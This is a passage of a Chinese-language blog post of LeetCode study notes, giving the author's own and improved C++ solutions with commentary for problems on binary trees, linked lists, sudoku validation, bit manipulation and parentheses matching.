if(root-&gt;right != nullptr){            if(root-&gt;right-&gt;val &lt;= root-&gt;val)                 flag=false;            else                flag=isValidBST(root-&gt;right);                            }        return flag;    }};</code></pre><h3 id="网络优解"><a href="#网络优解" class="headerlink" title="网络优解"></a>网络优解</h3><p>想法就是通过每个节点与右子树的最小值、左子树的最大值比较来判断，但是在记录这个最大值与最小值实现上就有些困难了。学习一波别人的写法</p><pre><code class="C++">//递归解法class Solution {public:    bool helper(TreeNode* root, long long lower, long long upper) {        if (root == nullptr) return true;        if (root -&gt; val &lt;= lower || root -&gt; val &gt;= upper) return false;        return helper(root -&gt; left, lower, root -&gt; val) &amp;&amp; helper(root -&gt; right, root -&gt; val, upper);    }    bool isValidBST(TreeNode* root) {        return helper(root, LONG_MIN, LONG_MAX);    }};//与个人想法不同，官方解答是从上往下解决的，精髓就在helper函数的return语句中。从上往下解决的话就需要在判断左子树的时候不断的向下传递最小值，右子树则是最大值//解法二,利用中序遍历二叉搜索树之后是有序的,总是与前一个节点来比较判断class Solution {public:    long long cur=LLONG_MIN;    bool isValidBST(TreeNode* root) {        if(nullptr == root) return true;        if(!isValidBST(root-&gt;left))             return false;        if(root-&gt;val &lt;= cur )            return false;        cur=root-&gt;val;        return isValidBST(root-&gt;right);    }};</code></pre><h2 id="36-有效的数独"><a href="#36-有效的数独" class="headerlink" title="36. 有效的数独"></a><a href="https://leetcode-cn.com/problems/valid-sudoku/" target="_blank" rel="noopener">36. 有效的数独</a></h2><p>检查数据是否符合数独的要求，至于数组是否有解不需要管</p><h3 id="个人解答-3"><a href="#个人解答-3" class="headerlink" title="个人解答"></a>个人解答</h3><p>没有想到什么好的办法，比较暴力</p><pre><code class="C++">class Solution {public:    bool isValidSudoku(vector&lt;vector&lt;char&gt;&gt;&amp; board) {        unordered_map&lt;int,unordered_map&lt;int,int&gt;&gt; line,row,block;        for(int i=0;i&lt;9;i++) {            for(int j=0;j&lt;9;j++) {                if(board[i][j]!=&#39;.&#39;) {                    if(++line[i][board[i][j]-&#39;0&#39;] &gt;1) return false;                    if(++row[j][board[i][j]-&#39;0&#39;] &gt;1 ) return false;                    if(++block[(i/3)*3+(j/3)][board[i][j]-&#39;0&#39;]&gt;1) return false;                }            }         }        return true;       }};</code></pre><h3 id="改进-4"><a href="#改进-4" class="headerlink" title="改进"></a>改进</h3><p>大佬们的想法差不多，但是在写法上还是有差距，比如</p><pre><code class="C++">        //放弃使用其他数据结构，这样时间方面更加高效        int xsp[9][9] = {0};        int ysp[9][9] = {0};        int lsp[9][9] = {0};</code></pre><p>但是，也有不一样的想法：<br>遍历的时候保存每一个数出现的位置，这个保存是按位保存，行列下标最大为8，占8位，可以这样分：0<del>8位记录块，9</del>16位记录列，17~24记录行，遍历时进行或运算保存。参照这个思路，写一个C++代码：</p><pre><code class="C++">class Solution {public:    bool isValidSudoku(vector&lt;vector&lt;char&gt;&gt;&amp; board) {        int pos[9]={0};        for(int i=0;i&lt;9;i++ ) {            for(int j=0;j&lt;9;j++) {                if(board[i][j] != &#39;.&#39;) {                    int tmp= 1&lt;&lt;(18+i) | 1&lt;&lt;(9+j) | 1&lt;&lt;(i/3*3+j/3);   //位置记录                    if ((tmp &amp; pos[board[i][j]-&#39;1&#39;]) ==0 )                   //等于0，则不重复                        pos[board[i][j]-&#39;1&#39;] |= tmp;                  //将位置存储起来                    else                        return false;                }            }        }        return true；            }};</code></pre><p>运行效率不是一般的高，空间占用不是一般的少</p><h2 id="19-删除链表的倒数第N个节点"><a href="#19-删除链表的倒数第N个节点" class="headerlink" title="19. 删除链表的倒数第N个节点"></a><a href="https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/" target="_blank" rel="noopener">19. 删除链表的倒数第N个节点</a></h2><h3 id="个人解答-4"><a href="#个人解答-4" class="headerlink" title="个人解答"></a>个人解答</h3><p>若是N！=1即不删除末尾节点的话还是比较好说的，但是问题就是存在末尾节点的删除，若是双指针遍历到当前这个删除的节点是末尾节点的话比较不好处理，于是想着去查找倒数第N+1个节点  </p><pre><code class="C++">/** * Definition for singly-linked list. * struct ListNode { *     int val; *     ListNode *next; *     ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public:    ListNode* removeNthFromEnd(ListNode* head, int n) {        ListNode* prev=head,*curr=head;        int m=n;        while(curr!=nullptr) {            if(m!=-1) {                curr=curr-&gt;next;                m--;                            }            else {                curr=curr-&gt;next;                prev=prev-&gt;next;            }        }         if(prev==head &amp;&amp; m!=-1){    //还在头节点，且没能到达倒数第N+1个节点            head=head-&gt;next;        }        else{            prev-&gt;next=prev-&gt;next-&gt;next;   //倒数第N+1个节点一定不是末尾节点        }        return head;    }};</code></pre><h3 id="改进-5"><a href="#改进-5" class="headerlink" title="改进"></a>改进</h3><p>ennn，为了简化上面代码的if判断，大佬们在head之前就假如一个哑节点，这样保证一定能够找到倒数第N+1个节点</p><pre><code class="C++">class Solution {public:    ListNode* removeNthFromEnd(ListNode* head, int n) {        ListNode *tmp=new ListNode(0);        tmp-&gt;next=head;        ListNode* prev=tmp,*curr=tmp;        int m=n;        while(curr!=nullptr) {            if(m!=-1) {                curr=curr-&gt;next;                m--;                            }            else {                curr=curr-&gt;next;                prev=prev-&gt;next;            }        }        prev-&gt;next=prev-&gt;next-&gt;next;        return tmp-&gt;next;    }};</code></pre><p>很棒的想法</p><h2 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206. 反转链表"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list/" target="_blank" rel="noopener">206. 反转链表</a></h2><h3 id="个人解答-5"><a href="#个人解答-5" class="headerlink" title="个人解答"></a>个人解答</h3><p>最直接的想法就是遍历，使用头插法</p><pre><code class="C++">/** * Definition for singly-linked list. * struct ListNode { *     int val; *     ListNode *next; *     ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public:    ListNode* reverseList(ListNode* head) {        ListNode*  result=nullptr;        while(head!=nullptr) {            ListNode * tmp= new ListNode(head-&gt;val);            tmp-&gt;next=result;            result=tmp;                        head=head-&gt;next;        }                return result;    }};</code></pre><h3 id="改进-6"><a href="#改进-6" class="headerlink" title="改进"></a>改进</h3><p>上面的写法还是不太好，直接修改当前节点的next值就好，无需使用复制构造函数重新进行产生一个新链表</p><pre><code class="C++">//上面写法的改进class Solution {public:    ListNode* reverseList(ListNode* head) {        ListNode*  result=nullptr;        while(head!=nullptr) {            ListNode * tmp= head-&gt;next;            head-&gt;next=result;            result=head;            head=tmp;        }                return result;    }};</code></pre><p>头插法很容易想到，但是题目说提到了递归就没有想到什么办法，之前是这样写的</p><pre><code class="C++">/** * Definition for singly-linked list. * struct ListNode { *     int val; *     ListNode *next; *     ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public:    ListNode* reverseList(ListNode* head) {//错误解答                if(head-&gt;next==nullptr) return head;        ListNode * tmp= new ListNode(head-&gt;val);        ListNode * result=reverseList(head-&gt;next);        result-&gt;next=tmp;           return result;  //返回的是逆序链表的头结点,这里在不断的进行覆盖，所以最终结果只有头尾    }};</code></pre><p>贴一下大佬们谢达JAVA代码</p><pre><code class="JAVA">//类似C++的传值引用public ListNode reverseList(ListNode head) {    if (head == null || head.next == null) return head;      //返回非null指针，即最后一个节点    ListNode p = reverseList(head.next);              //head最远为倒数第二个指针，即将完成倒数1,2的逆序    head.next.next = head;          //将倒数1的Next指向倒数2    head.next = null;               //取消倒数2的Next指向倒数1，否则有环    return p;                       //返回逆序链表的头指针}</code></pre><p>改写一下变C++ </p><pre><code class="C++">class Solution {public:    ListNode* reverseList(ListNode* head) {        if (head==nullptr || head-&gt;next == nullptr) return head;        ListNode* tmp = head;        ListNode* result = reverseList(head-&gt;next);          tmp-&gt;next-&gt;next = tmp;        tmp-&gt;next = nullptr;        return result;    }};</code></pre><div align=center><img src="./206. 反转链表/递归.gif" alt="递归思路" /></div> <p>参考链接：</p><ol><li><a href="https://leetcode-cn.com/problems/reverse-linked-list/solution/dong-hua-yan-shi-206-fan-zhuan-lian-biao-by-user74/" target="_blank" rel="noopener">作者：王尼玛</a></li></ol><h1 id="普通题目"><a href="#普通题目" class="headerlink" title="普通题目"></a>普通题目</h1><h2 id="326-3的幂"><a href="#326-3的幂" class="headerlink" title="326. 3的幂"></a><a href="https://leetcode-cn.com/problems/power-of-three/" target="_blank" rel="noopener">326. 3的幂</a></h2><h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>简单的题目处处是细节</p><pre><code class="C++">//不使用循环递归class Solution {public:    bool isPowerOfThree(int n) {    if(n &lt;= 0) return false;    double a = log10(n) / log10(3) ;        //换底    return  a == floor(a);         //判断换底后的log3n是否为整数，即n是否为3的倍数    }};//或者class Solution {public:    bool isPowerOfThree(int n) {        return n &gt; 0 &amp;&amp; 1162261467 % n == 0;        //1162261467为int型范围内最大的3的倍数    }};</code></pre><h2 id="121-买卖股票的最佳时机"><a href="#121-买卖股票的最佳时机" class="headerlink" title="121. 买卖股票的最佳时机"></a><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/" target="_blank" rel="noopener">121. 买卖股票的最佳时机</a></h2><h3 id="个人解答-6"><a href="#个人解答-6" class="headerlink" title="个人解答"></a>个人解答</h3><p>与之前的题目不同,此次只能进行一次交易.如果最基础的暴力枚举的话时间超时,所以把暴力枚举给优化了一点点</p><pre><code class="C++">class Solution {public:    int maxProfit(vector&lt;int&gt;&amp; prices) {        if(0==prices.size()) return 0;        int Max=0;        vector&lt;int&gt; TurnPoint;        for(int i=0;i&lt;prices.size()-1;i++)            TurnPoint.push_back(prices[i+1]-prices[i]);        for(int i=0;i&lt;TurnPoint.size();i++) {            int tmp=0;            //不写if判断的话也超时            if(TurnPoint[i]&gt;0){                for(int j=i;j&lt;TurnPoint.size();j++) {                tmp+=TurnPoint[j];                Max=tmp &gt; Max ? tmp :Max;                }            }        }        return Max;    }};</code></pre><p>这种暴力枚举可以说实在超时的边缘徘徊</p><h3 id="网络优解-1"><a href="#网络优解-1" class="headerlink" title="网络优解"></a>网络优解</h3><pre><code class="C++">//记录已经遍历过的最小值,因为不需要考虑中间的数据变化,所以通过不断的更当前的最小值相减,来计算出在当天以前的最小值买入,再当天卖出的利润class Solution {public:    int maxProfit(vector&lt;int&gt;&amp; prices) {        int inf = INT_MAX;        int minprice = inf, maxprofit = 0;        for (int price: prices) {            maxprofit = max(maxprofit, price - minprice);            minprice = min(price, minprice);        }        return maxprofit;    }};</code></pre><h2 id="70-爬楼梯"><a href="#70-爬楼梯" class="headerlink" title="70. 爬楼梯"></a><a href="https://leetcode-cn.com/problems/climbing-stairs/" target="_blank" rel="noopener">70. 爬楼梯</a></h2><h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>第一次写的递归,想要爬到第n层,可以从第n-1层上来,也可以从第n-2层中上来.当从第n-2层上来的时候,最后两步仍采用1.1的办法,则有可能重叠,故不做倍乘处理.但时间运行超时</p><pre><code class="C++">class Solution {public:    int climbStairs(int n) {        if(n==0 || n==1 ) return 1;        return climbStairs(n-1)+climbStairs(n-2);    }};</code></pre><p>再仔细看,不就是斐波那契数列嘛..于是</p><pre><code class="C++">class Solution {public:    int climbStairs(int n) {        long left=1,right=1,tmp;        for(int i=1;i&lt;n;i++) {            tmp=right;            right+=left;            left=tmp;        }        return right;    }};</code></pre><h2 id="278-第一个错误的版本"><a href="#278-第一个错误的版本" class="headerlink" title="278. 第一个错误的版本"></a><a href="https://leetcode-cn.com/problems/first-bad-version/" target="_blank" rel="noopener">278. 第一个错误的版本</a></h2><h3 id="个人解答-7"><a href="#个人解答-7" class="headerlink" title="个人解答"></a>个人解答</h3><p>比较简单,二分查找</p><pre><code class="C++">class Solution {public:    int firstBadVersion(int n) {        long long left=0,right=n;        while(left&lt;=right) {            bool front=isBadVersion((left+right)/2);            bool behind=isBadVersion((left+right)/2+1);            if(!front &amp;&amp; behind )                return (left+right)/2+1;            if(front)                right=(left+right)/2;            if(!behind)                left=(left+right)/2+1;        }        return left;      }};</code></pre><h2 id="108-将有序数组转换为二叉搜索树"><a href="#108-将有序数组转换为二叉搜索树" class="headerlink" title="108. 将有序数组转换为二叉搜索树"></a><a href="https://leetcode-cn.com/problems/convert-sorted-array-to-binary-search-tree/" target="_blank" rel="noopener">108. 将有序数组转换为二叉搜索树</a></h2><h3 id="个人解答-8"><a href="#个人解答-8" class="headerlink" title="个人解答"></a>个人解答</h3><p>想法比较简单,搜索树的中序遍历结果就是有序的数组,按照这个规律尝试还原就行</p><pre><code class="C++">class Solution {public:    TreeNode* sortedArrayToBST(vector&lt;int&gt;&amp; nums) {        if(nums.size()==0) return nullptr;        TreeNode* head=new TreeNode(nums[nums.size()/2]);        vector&lt;int&gt; Left(nums.begin(),nums.begin()+nums.size()/2);        head-&gt;left=sortedArrayToBST(Left);        vector&lt;int&gt; Right(nums.begin()+nums.size()/2+1,nums.end());        head-&gt;right=sortedArrayToBST(Right);        return head;     }};</code></pre><p>题目比较简单,但是在写法上还有改进的地方,重新定义一个函数,只传递nums的范围就行,无须不断的重新定义赋值</p><h2 id="101-对称二叉树"><a href="#101-对称二叉树" class="headerlink" title="101. 对称二叉树"></a><a href="https://leetcode-cn.com/problems/symmetric-tree/" target="_blank" rel="noopener">101. 对称二叉树</a></h2><h3 id="个人解答-9"><a href="#个人解答-9" class="headerlink" title="个人解答"></a>个人解答</h3><p>按照[102. 二叉树的层序遍历]最开始的写法,通过插入nullptr来解决问题,是行不通的,因为之前值删除了nullptr节点,本题没法复制之前的思路</p><pre><code class="C++">/** * Definition for a binary tree node. * struct TreeNode { *     int val; *     TreeNode *left; *     TreeNode *right; *     TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public:    bool isSymmetric(TreeNode* root) {        if(nullptr == root) return true;        queue&lt;TreeNode* &gt; tmp;        vector&lt;int &gt;nums;        tmp.push(root);        while(!tmp.empty()) {            int linelength=tmp.size();            for(int i=0;i&lt;linelength;i++) {                TreeNode* node=tmp.front();                tmp.pop();                if(nullptr != node) {                    tmp.push(node-&gt;left);                    tmp.push(node-&gt;right);                    nums.push_back(node-&gt;val);                }                else                    nums.push_back(INT_MAX);            }            for(int i=0;i&lt;nums.size()/2;i++) {                if(nums[i]!=nums[nums.size()-i-1])                    return false;            }            nums.clear();             }        return true;     }};</code></pre><h3 id="网络优解-2"><a href="#网络优解-2" class="headerlink" title="网络优解"></a>网络优解</h3><p>大佬们给出了双指针的办法,简单易懂</p><pre><code class="C++">class Solution {public:    bool isSymmetric(TreeNode* root) {        if(nullptr == root) return true;        return check(root-&gt;left,root-&gt;right);    }    bool check(TreeNode* front,TreeNode* behind) {        if(nullptr == front &amp;&amp; nullptr == behind)            return true;        else if (nullptr == front || nullptr == behind )            return false;        return front-&gt;val==behind-&gt;val &amp;&amp; check(front-&gt;left,behind-&gt;right) &amp;&amp; check(front-&gt;right,behind-&gt;left);    }};</code></pre><p>大佬们也有通过队列实现的办法,但不是层序遍历,也是利用双指针,将要对比的对象一起存放到队列中,再判断比较,压入下一个要比较的对象.其做法精髓都是双指针访问对比</p><h2 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102. 二叉树的层序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-level-order-traversal/" target="_blank" rel="noopener">102. 二叉树的层序遍历</a></h2><h3 id="个人解答-10"><a href="#个人解答-10" class="headerlink" title="个人解答"></a>个人解答</h3><p>知道需要使用到queue，但是不知道怎么记录行信息，于是在queue中插如空指针来表示行结束</p><pre><code class="C++">/** * Definition for a binary tree node. * struct TreeNode { *     int val; *     TreeNode *left; *     TreeNode *right; *     TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public:    vector&lt;vector&lt;int&gt;&gt; levelOrder(TreeNode* root) {        if(nullptr == root ) return {};        queue&lt;TreeNode*&gt; tree;        vector&lt;vector&lt;int&gt;&gt; result;        vector&lt;int&gt; tmp;                tree.push(root);        tree.push(nullptr);        while(!tree.empty()) {            TreeNode* haha=tree.front();            tree.pop();            tmp.push_back(haha-&gt;val);            if(nullptr!=haha-&gt;left) tree.push(haha-&gt;left);            if(nullptr!=haha-&gt;right) tree.push(haha-&gt;right);            if(nullptr==tree.front()) {                tree.pop();                if(!tree.empty()) tree.push(nullptr);                result.push_back(tmp);                tmp.clear();            }        }        return result;    }};</code></pre><h3 id="改进-7"><a href="#改进-7" class="headerlink" title="改进"></a>改进</h3><p>首解写的这么麻烦，主要是不知道怎么保存行信息，上面的代码主要是通过插入nullptr来隔离分开不同行信息，但是相应的没有保存树中nullptr节点，该方法在题目【堆成二叉树】就无法使用了。所以这个写法并不是很好</p><pre><code class="C++">class Solution {public:    vector&lt;vector&lt;int&gt;&gt; levelOrder(TreeNode* root) {        vector &lt;vector &lt;int&gt;&gt; ret;        if (!root) return ret;        queue &lt;TreeNode*&gt; q;        q.push(root);        while (!q.empty()) {            int currentLevelSize = q.size();            ret.push_back(vector &lt;int&gt; ());            for (int i = 1; i &lt;= currentLevelSize; ++i) {                auto node = q.front(); q.pop();                ret.back().push_back(node-&gt;val);                if (node-&gt;left) q.push(node-&gt;left);                if (node-&gt;right) q.push(node-&gt;right);            }        }        return ret;    }};</code></pre><p>挺不错的写法，使用“currentLevelSize”保存了行的个数，当访问“currentLevelSize”个数据之后，队列中只包含当前行的节点。</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>学习一下DFS的写法</p><pre><code class="C++">class Solution {public:    vector&lt;vector&lt;int&gt;&gt; levelOrder(TreeNode* root) {        vector&lt;vector&lt;int&gt;&gt; res;        Dfs(res,root,0);        return res;    }    void Dfs(vector&lt;vector&lt;int&gt;&gt; &amp;result, TreeNode* node,int level) {        if(nullptr==node)            return;        if(result.size()&lt;=level)            result.push_back({});        result[level].push_back(node-&gt;val);        Dfs(result,node-&gt;left,level+1);        Dfs(result,node-&gt;right,level+1);    }};</code></pre><h2 id="104-二叉树的最大深度"><a href="#104-二叉树的最大深度" class="headerlink" title="104. 二叉树的最大深度"></a><a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/" target="_blank" rel="noopener">104. 二叉树的最大深度</a></h2><h3 id="个人解答-11"><a href="#个人解答-11" class="headerlink" title="个人解答"></a>个人解答</h3><p>想法比较简单</p><pre><code class="C++">/** * Definition for a binary tree node. * struct TreeNode { *     int val; *     TreeNode *left; *     TreeNode *right; *     TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public:    int maxDepth(TreeNode* root) {        if(root==nullptr) return 0;        return max(maxDepth(root-&gt;left),maxDepth(root-&gt;right))+1;      }};</code></pre><p>时间复杂度是O(n),当只有做节点或者右节点时空间复杂度为o(n),当树为平衡二叉树时为O(log(n))</p><h2 id="35-搜索插入位置"><a href="#35-搜索插入位置" class="headerlink" title="35. 搜索插入位置"></a><a href="https://leetcode-cn.com/problems/search-insert-position/" target="_blank" rel="noopener">35. 搜索插入位置</a></h2><h3 id="个人解答-12"><a href="#个人解答-12" class="headerlink" title="个人解答"></a>个人解答</h3><pre><code class="C++">class Solution {public:    int searchInsert(vector&lt;int&gt;&amp; nums, int target) {        for(int i=0;i&lt;nums.size();i++) {            if(target&lt;=nums[i])                return i;        }        return nums.size();    }};</code></pre><h3 id="改进-8"><a href="#改进-8" class="headerlink" title="改进"></a>改进</h3><p>好长时间不写代码，二分查找都没有想到了。。。。</p><pre><code class="C++">class Solution {public:    int searchInsert(vector&lt;int&gt;&amp; nums, int target) {        int left=0;        int right=nums.size();        while(left&lt;right) {            int mid=(left+right)/2;            if(nums[mid]==target)                return mid;            if(nums[mid]&lt;target)                left=mid+1;            else                right=mid;        }           return left;    }};</code></pre><p>与一般的二分查找不同，当查找不到的时候left将停留在大于target的地址位置</p><h2 id="724-寻找数组的中心索引"><a href="#724-寻找数组的中心索引" class="headerlink" title="724. 寻找数组的中心索引"></a><a href="https://leetcode-cn.com/problems/find-pivot-index/" target="_blank" rel="noopener">724. 寻找数组的中心索引</a></h2><p>找一个下标，使得左右两边数据和相等，比较简单</p><pre><code class="C++">class Solution {public:    int pivotIndex(vector&lt;int&gt;&amp; nums) {        int right=0;        for(int tmp:nums)            right+=tmp;        int left=0;        for(int i=0;i&lt;nums.size();i++) {            if(i!=0) left+=nums[i-1];            right-=nums[i];            if(right==left) return i;        }        return -1;    }};</code></pre><h2 id="234-回文链表"><a href="#234-回文链表" class="headerlink" title="234. 回文链表"></a><a href="https://leetcode-cn.com/problems/palindrome-linked-list/" target="_blank" rel="noopener">234. 回文链表</a></h2><h3 id="个人解答-13"><a href="#个人解答-13" class="headerlink" title="个人解答"></a>个人解答</h3><pre><code class="C++">/** * Definition for singly-linked list. * struct ListNode { *     int val; *     ListNode *next; *     ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public:    bool isPalindrome(ListNode* head) {        vector &lt;int&gt; s;        ListNode* tmp=head;        while(tmp!=nullptr) {            s.push_back(tmp-&gt;val);            tmp=tmp-&gt;next;        }            for(int i=0;i&lt;s.size()/2;i++) {            if(s[i]!=s[s.size()-i-1])                return false;        }        return true;    }};</code></pre><p>想法比较直接嘛，因为单链表不能随机访问，所以第一个想法就是保存下载，然后对比判断。没有想到”O(n)时间复杂度和O(1)空间复杂度”的办法  </p><h3 id="另解"><a href="#另解" class="headerlink" title="另解"></a>另解</h3><p>大佬们提出了改变程序输入的办法，将输入划分为两部分链表，逆序其中的一个，再进行判断比较。如此可以做到空间复杂度为O(1)。参照这个思路，自己写下：</p><pre><code class="C++">class Solution {public:    bool isPalindrome(ListNode* head) {        ListNode * tmp=head,*SecHead=head;        //找到第二个部分链表的头结点,同时逆序第一部分        ListNode *FirHead= new ListNode(0);        while(tmp!=nullptr &amp;&amp; tmp-&gt;next!=nullptr) {            tmp=tmp-&gt;next-&gt;next;            ListNode *curr=SecHead-&gt;next;            SecHead-&gt;next=FirHead-&gt;next;            FirHead-&gt;next=SecHead;            SecHead=curr;                }        //tmp不为空，则说明奇数个节点，SecHead在中间位置        if(tmp!=nullptr)            SecHead=SecHead-&gt;next;        //判断        FirHead=FirHead-&gt;next;        while(FirHead!=nullptr &amp;&amp; SecHead!=nullptr){            if(FirHead-&gt;val != SecHead-&gt;val)                return false;                FirHead=FirHead-&gt;next;                SecHead=SecHead-&gt;next;        }        return true;    }};</code></pre><h2 id="21-合并两个有序链表"><a href="#21-合并两个有序链表" class="headerlink" title="21. 合并两个有序链表"></a><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/" target="_blank" rel="noopener">21. 合并两个有序链表</a></h2><h3 id="个人解答-14"><a href="#个人解答-14" class="headerlink" title="个人解答"></a>个人解答</h3><p>想法比较简单,遍历比较然后插入到l1中,但是因为存在多种情况:l1没有内容;l1遍历结束,但是l2没有……使用了大量的条件判断</p><pre><code class="C++">/** * Definition for singly-linked list. * struct ListNode { *     int val; *     ListNode *next; *     ListNode() : val(0), next(nullptr) {} *     ListNode(int x) : val(x), next(nullptr) {} *     ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */class Solution {public:    ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) {        if(l1==nullptr) return l2;        ListNode* tmp1=l1,*tmp2=l2;        while(tmp1!=nullptr &amp;&amp; tmp2!=nullptr) {            if(tmp1-&gt;val &gt;= tmp2-&gt;val) {                ListNode * temp=new ListNode(tmp1-&gt;val,tmp1-&gt;next);                tmp1-&gt;val = tmp2-&gt;val;                tmp1-&gt;next= temp;                tmp2=tmp2-&gt;next;            }            if(tmp1-&gt;next!=nullptr)                tmp1=tmp1-&gt;next;            else                break;       //l1先遍历结束时，停留在末尾节点，以便追加剩下的l2；        }        if(tmp2!=nullptr) tmp1-&gt;next = tmp2;        return l1;    }};</code></pre><h3 id="改进-9"><a href="#改进-9" class="headerlink" title="改进"></a>改进</h3><p>上面的写法，当tmp2的节点需要插入到tmp1当前节点之前，所以只好把tmp2的值传递给tmp1，然后new一个tmp2的值，在tmp1后面追加。还可以优化</p><pre><code class="C++">class Solution {public:    ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) {        ListNode* result=new ListNode();        ListNode *tmp=result;                while(l1!=nullptr &amp;&amp; l2!=nullptr) {            if(l1-&gt;val &gt;= l2-&gt;val) {                tmp-&gt;next=l2;                l2=l2-&gt;next;            }            else {                tmp-&gt;next=l1;                l1=l1-&gt;next;            }            tmp=tmp-&gt;next;          }        tmp-&gt;next = l1!=nullptr?l1:l2;        return result-&gt;next;    }};</code></pre><p>大佬们贴出了递归的办法，自己写个</p><pre><code class="C++">class Solution {public:    ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) {        if(l1==nullptr) return l2;        if(l2==nullptr) return l1;        ListNode *head;        if(l1-&gt;val &gt;= l2-&gt;val) {            head=l2;            head-&gt;next=mergeTwoLists(l1,l2-&gt;next);        }        else {            head=l1;            head-&gt;next=mergeTwoLists(l1-&gt;next,l2);        }        return head;           }};</code></pre><h2 id="141-环形链表"><a href="#141-环形链表" class="headerlink" title="141. 环形链表"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle/" target="_blank" rel="noopener">141. 环形链表</a></h2><p>理解的半天，就是输入链表，检查是否存在环</p><h3 id="个人解答-15"><a href="#个人解答-15" class="headerlink" title="个人解答"></a>个人解答</h3><p>题目要求常量解决，这样想的，快慢指针，如果快指针为空，则没环；如果两者相等，则有环</p><pre><code class="C++">/** * Definition for singly-linked list. * struct ListNode { *     int val; *     ListNode *next; *     ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public:    bool hasCycle(ListNode *head) {        ListNode *prev=head,*curr=head;        int length=0;        while(prev!=nullptr &amp;&amp; curr!=nullptr) {            prev=prev-&gt;next;            curr=curr-&gt;next;            if(curr!=nullptr)                 curr=curr-&gt;next;            else                return false;            if(curr==prev)                 return true;        }        return false;    }};</code></pre><p>不要到循环开始的位置，所以采用了这样的办法，但这样写感觉有点不好，最坏的情况就是快指针需要遍历三遍才能追上慢指针<br>与大佬们的想法是差不多的；也可以使用hash表，保存当前节点的地址。</p><h2 id="190-颠倒二进制位-–-分治"><a href="#190-颠倒二进制位-–-分治" class="headerlink" title="190. 颠倒二进制位 –　分治"></a><a href="https://leetcode-cn.com/problems/reverse-bits/" target="_blank" rel="noopener">190. 颠倒二进制位 –　分治</a></h2><p>把一个数的二进制表达式的数字顺序颠倒</p><h3 id="个人解答-16"><a href="#个人解答-16" class="headerlink" title="个人解答"></a>个人解答</h3><p>题目指定了是32位，所以按位处理就好</p><pre><code class="C++">class Solution {public:    uint32_t reverseBits(uint32_t n) {        uint32_t result=0;        for(int i=0;i&lt;=31;i++) {            result=(result&lt;&lt;1)+(n&amp;1);            n=n&gt;&gt;1;        }        return result;    }};</code></pre><h3 id="另解-1"><a href="#另解-1" class="headerlink" title="另解"></a>另解</h3><p>学习一下其他人分治合并的思路，先贴代码</p><pre><code class="C++">class Solution {public:    uint32_t reverseBits(uint32_t n) {                                     n = (n &gt;&gt; 16) | (n &lt;&lt; 16);                                         n = ((n &amp; 0xff00ff00) &gt;&gt; 8) | ((n &amp; 0x00ff00ff) &lt;&lt; 8);             n = ((n &amp; 0xf0f0f0f0) &gt;&gt; 4) | ((n &amp; 0x0f0f0f0f) &lt;&lt; 4);        n = ((n &amp; 0xcccccccc) &gt;&gt; 2) | ((n &amp; 0x33333333) &lt;&lt; 2);   //0xc:  1100  ;0x3 : 0011        n = ((n &amp; 0xaaaaaaaa) &gt;&gt; 1) | ((n &amp; 0x55555555) &lt;&lt; 1);   //0xa:  1010  ;0x5 : 0101        return n;    }};</code></pre><div align=center><img src="./190. 颠倒二进制位/分治举例.png" alt="分治举例" /></div> <p>从上往下解决问题  </p><h2 id="191-位1的个数"><a href="#191-位1的个数" class="headerlink" title="191. 位1的个数"></a><a href="https://leetcode-cn.com/problems/number-of-1-bits/" target="_blank" rel="noopener">191. 位1的个数</a></h2><p>题目比较简单，主要学习一下位操作</p><h3 id="个人解答-17"><a href="#个人解答-17" class="headerlink" title="个人解答"></a>个人解答</h3><pre><code class="C++">class Solution {public:    int hammingWeight(uint32_t n) {        int result=0;        while(n !=0){            if(n&amp;1==1)                result++;            n=n&gt;&gt;1;        }        return result;    }};</code></pre><h3 id="另解-2"><a href="#另解-2" class="headerlink" title="另解"></a>另解</h3><pre><code class="C++">class Solution {public:    int hammingWeight(uint32_t n) {        int sum = 0;        while (n != 0) {            sum++;            n &amp;= (n - 1);        }        return sum;    }};</code></pre><p>这种解法比较骚，首先是不断的<code>n &amp;= (n - 1);</code>，n最后都会为0，再者以<code>n != 0</code>作为sum++的依据，不容易想到。如果n是奇数的话，末尾为1，通过与n-1于运算消除，若n为偶数，通过n-1与运算又能将最右边的1消除。效率更高～666</p><h2 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20. 有效的括号"></a><a href="https://leetcode-cn.com/problems/valid-parentheses/" target="_blank" rel="noopener">20. 有效的括号</a></h2><h3 id="个人解答-18"><a href="#个人解答-18" class="headerlink" title="个人解答"></a>个人解答</h3><p>题目的输入比较简单，使用栈比较直接，贴上个人首解</p><pre><code class="C++">class Solution {public:    bool isValid(string s) {        if(s.size()%2!=0) return false;        stack&lt;char&gt; tmp;        for(int i=0;i&lt;s.size();i++) {            switch(s[i]){                case &#39;{&#39;:                case &#39;(&#39;:                case &#39;[&#39;:                    tmp.push(s[i]);                    break;                case &#39;)&#39;:                    if(!tmp.empty() &amp;&amp; tmp.top()==&#39;(&#39;)                        tmp.pop();                    else                        return false;                    break;                case &#39;}&#39;:                    if(!tmp.empty() &amp;&amp; tmp.top()==&#39;{&#39;)                        tmp.pop();                    else                        return false;                    break;                case &#39;]&#39;:                    if(!tmp.empty() &amp;&amp; 